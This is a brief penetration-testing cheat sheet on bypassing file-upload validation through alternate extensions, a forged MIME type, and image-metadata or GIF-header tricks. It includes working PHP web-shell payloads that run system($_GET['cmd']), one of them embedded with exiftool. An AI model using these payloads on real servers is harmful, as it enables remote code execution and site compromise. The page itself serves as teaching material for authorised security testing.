# File upload

## File upload bypass

File upload mechanisms are very common on websites, but sometimes have poor validation. This allows attackers to upload malicious files to the web server, which can then be executed by other users or the server itself. This can also happen in authenticated areas of a website (e.g. installing WordPress plugins)

### File extension <a href="#file-extension" id="file-extension"></a>

Developers may blacklist specific file extensions and prevent users from uploading files with extensions that are considered dangerous. This can be bypassed by using alternate extensions or even unrelated ones. For example, it might be possible to upload and execute a `.php` file simply by renaming it `file.php.jpg` or `file.PHp`.

**Alternate extensions**

| Type       | Extension                                  |
| ---------- | ------------------------------------------ |
| php        | phtml, .php, .php3, .php4, .php5, and .inc |
| asp        | asp, .aspx                                 |
| perl       | .pl, .pm, .cgi, .lib                       |
| jsp        | .jsp, .jspx, .jsw, .jsv, and .jspf         |
| Coldfusion | .cfm, .cfml, .cfc, .dbm                    |

### MIME type <a href="#mime-type" id="mime-type"></a>

Blacklisting MIME types is also a method of file upload validation. It may be bypassed by intercepting the POST request on the way to the server and modifying the MIME type.

Normal php MIME type:

Copy

```
Content-type: application/x-php
```

Replace with:

Copy

```
Content-type: image/jpeg
```

### PHP getimagesize() <a href="#php-getimagesize" id="php-getimagesize"></a>

For file uploads which validate image size using php `getimagesize()`, it may be possible to execute shellcode by inserting it into the Comment attribute of Image properties and saving it as `file.jpg.php`.

You can do this with gimp or exiftools:

Copy

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
mv file.jpg file.php.jpg
```

I'm not sure why some tutorials have the php extension first while others have it second. Try both.

### GIF89a; header <a href="#gif89a-header" id="gif89a-header"></a>

GIF89a is a GIF file header. If uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:

Copy

```
GIF89a;
<?
system($_GET['cmd']); # shellcode goes here
?>
```

### Further reading <a href="#further-reading" id="further-reading"></a>

* [Injecting malicious PHP into an image file](http://techyzilla.blogspot.com/2012/07/injecting-malicious-php-in-to-an-image-file.html)
* [Bypassing file upload restrictions](https://pentestlab.blog/2012/11/29/bypassing-file-upload-restrictions/)
